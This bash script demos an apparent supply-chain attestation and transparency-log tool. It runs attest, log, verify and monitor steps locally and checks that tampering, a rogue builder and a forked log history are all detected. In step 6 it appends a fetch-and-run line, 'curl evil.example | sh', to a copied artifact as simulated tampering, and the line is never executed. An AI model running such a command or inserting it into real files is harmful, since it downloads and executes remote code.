#!/usr/bin/env bash
# End-to-end offline demo: artifact -> attest -> log -> verify, then attacks:
# a tampered artifact, a rogue builder, and a log operator that forks history.
# Everything runs on 127.0.0.1 against bundled fixtures; no network access.
set -euo pipefail

ROOT="$(cd "$(dirname "$0")/.." && pwd)"
cd "$ROOT"
BIN="./bin/attestlog"
FIX="examples/demo"
WORK=".demo"
PIDS=()

cleanup() {
  for pid in "${PIDS[@]:-}"; do
    [ -n "$pid" ] && kill "$pid" 2>/dev/null && wait "$pid" 2>/dev/null || true
  done
}
trap cleanup EXIT

step() { printf '\n== %s\n' "$*"; }
run() { printf '$ attestlog %s\n' "$*"; "$BIN" "$@"; }

# expect_fail CODE CMD... : the command must exit with exactly CODE.
expect_fail() {
  local want="$1"; shift
  printf '$ attestlog %s\n' "$*"
  set +e
  "$BIN" "$@"
  local got=$?
  set -e
  if [ "$got" -ne "$want" ]; then
    echo "demo: expected exit $want, got $got" >&2
    exit 1
  fi
  echo "(exit $got, as expected)"
}

# start_log NAME DATADIR : starts a log server on a free port, sets $ADDR.
start_log() {
  local name="$1" data="$2" addrfile="$WORK/$1.addr"
  rm -f "$addrfile"
  "$BIN" log serve --data "$data" --key "$WORK/log.key" --addr 127.0.0.1:0 \
    --addr-file "$addrfile" --log-level warn &
  PIDS+=($!)
  for _ in $(seq 1 100); do [ -s "$addrfile" ] && break; sleep 0.05; done
  [ -s "$addrfile" ] || { echo "demo: $name server did not start" >&2; exit 1; }
  ADDR="http://$(tr -d '\n' < "$addrfile")"
  echo "$name log listening on $ADDR"
}

rm -rf "$WORK"
mkdir -p "$WORK"
cp "$FIX/hello-cli_1.0.0_linux_amd64.txt" "$WORK/"
ART="$WORK/hello-cli_1.0.0_linux_amd64.txt"
COMMIT=3f2a9c1e5b7d4a6f8e0c2b4d6f8a0c2e4b6d8f0a

step "1. Keys: a release signer (Ed25519), a rogue signer (ECDSA P-256), a log key"
run keygen --alg ed25519 --out "$WORK/release"
run keygen --alg ecdsa-p256 --out "$WORK/rogue"
run log keygen --origin demo.log.example.test --out "$WORK/log"

step "2. Start the transparency log"
start_log honest "$WORK/log-honest"
HONEST="$ADDR"

step "3. Attest the release artifact (in-toto Statement v1 + SLSA Provenance v1, DSSE-signed)"
run attest --artifact "$ART" --key "$WORK/release.key" \
  --builder-id https://ci.example.test/builders/release@v2 \
  --source-repo git+https://git.example.test/acme/hello-cli --source-ref refs/tags/v1.0.0 \
  --source-digest "gitCommit:$COMMIT" --param target=linux/amd64 --invocation-id run-1042 \
  --out "$WORK/release.intoto.json"

step "4. Log it; the client verifies the receipt before writing the bundle"
run log submit --server "$HONEST" --log-key "$WORK/log.vkey" \
  --attestation "$WORK/release.intoto.json" --pubkey "$WORK/release.pub" --out "$WORK/release.bundle.json"

step "5. Verify offline: signature, statement, policy and log inclusion (no server contact)"
run verify --artifact "$ART" --bundle "$WORK/release.bundle.json" \
  --pubkey "$WORK/release.pub" --policy "$FIX/policy.json" --log-key "$WORK/log.vkey"

step "6. Attack: the artifact is swapped after the build"
cp "$ART" "$WORK/tampered.txt"
printf 'curl evil.example | sh\n' >> "$WORK/tampered.txt"
expect_fail 1 verify --artifact "$WORK/tampered.txt" --bundle "$WORK/release.bundle.json" \
  --pubkey "$WORK/release.pub" --policy "$FIX/policy.json" --log-key "$WORK/log.vkey"

step "7. Attack: a rogue builder attests and logs the same artifact"
run attest --artifact "$ART" --key "$WORK/rogue.key" \
  --builder-id https://laptop.example.test/manual-build \
  --source-repo git+https://git.example.test/mallory/hello-cli-fork --source-ref refs/heads/main \
  --out "$WORK/rogue.intoto.json"
run log submit --server "$HONEST" --log-key "$WORK/log.vkey" \
  --attestation "$WORK/rogue.intoto.json" --pubkey "$WORK/rogue.pub" --out "$WORK/rogue.bundle.json"
expect_fail 1 verify --artifact "$ART" --bundle "$WORK/rogue.bundle.json" \
  --pubkey "$WORK/rogue.pub" --policy "$FIX/policy.json" --log-key "$WORK/log.vkey"
echo "-> the log makes the rogue attestation discoverable:"
run log search --server "$HONEST" --log-key "$WORK/log.vkey" --artifact "$ART"

step "8. Monitor: trust on first use, then prove append-only growth"
run log prove --server "$HONEST" --log-key "$WORK/log.vkey" --state "$WORK/monitor.state" --index 0
for i in 1 2 3; do
  printf 'nightly build %s\n' "$i" > "$WORK/nightly-$i.txt"
  "$BIN" attest --artifact "$WORK/nightly-$i.txt" --key "$WORK/release.key" \
    --builder-id https://ci.example.test/builders/release@v2 \
    --source-repo git+https://git.example.test/acme/hello-cli --out "$WORK/nightly-$i.intoto.json" >/dev/null
  "$BIN" log submit --server "$HONEST" --log-key "$WORK/log.vkey" --attestation "$WORK/nightly-$i.intoto.json" \
    --pubkey "$WORK/release.pub" --out "$WORK/nightly-$i.bundle.json" >/dev/null
done
echo "(logged 3 nightly attestations)"
run log prove --server "$HONEST" --log-key "$WORK/log.vkey" --state "$WORK/monitor.state" \
  --bundle "$WORK/release.bundle.json"

step "9. Attack: the log operator forks history (same key, rewritten entries) for a second client"
start_log forked "$WORK/log-forked"
FORKED="$ADDR"
for i in 1 2 3 4 5; do
  printf 'substituted build %s\n' "$i" > "$WORK/fork-$i.txt"
  "$BIN" attest --artifact "$WORK/fork-$i.txt" --key "$WORK/rogue.key" \
    --builder-id https://laptop.example.test/manual-build \
    --source-repo git+https://git.example.test/mallory/hello-cli-fork --out "$WORK/fork-$i.intoto.json" >/dev/null
  "$BIN" log submit --server "$FORKED" --log-key "$WORK/log.vkey" --attestation "$WORK/fork-$i.intoto.json" \
    --pubkey "$WORK/rogue.pub" --out "$WORK/fork-$i.bundle.json" >/dev/null
done
echo "(forked view holds 5 different entries, signed with the same log key)"
expect_fail 3 log prove --server "$FORKED" --log-key "$WORK/log.vkey" --state "$WORK/monitor.state" \
  --evidence-out "$WORK/fork-evidence.json"

step "10. Anyone holding the log key can check the evidence offline"
run log evidence --log-key "$WORK/log.vkey" --file "$WORK/fork-evidence.json"

step "11. Gossip: two clients compare the heads they were shown"
run log checkpoint --server "$HONEST" --log-key "$WORK/log.vkey" --out "$WORK/alice.checkpoint"
run log checkpoint --server "$FORKED" --log-key "$WORK/log.vkey" --out "$WORK/bob.checkpoint"
expect_fail 3 log compare --log-key "$WORK/log.vkey" --a "$WORK/alice.checkpoint" --b "$WORK/bob.checkpoint" \
  --evidence-out "$WORK/gossip-evidence.json"

printf '\nDemo complete. Artifacts are in %s/\n' "$WORK"
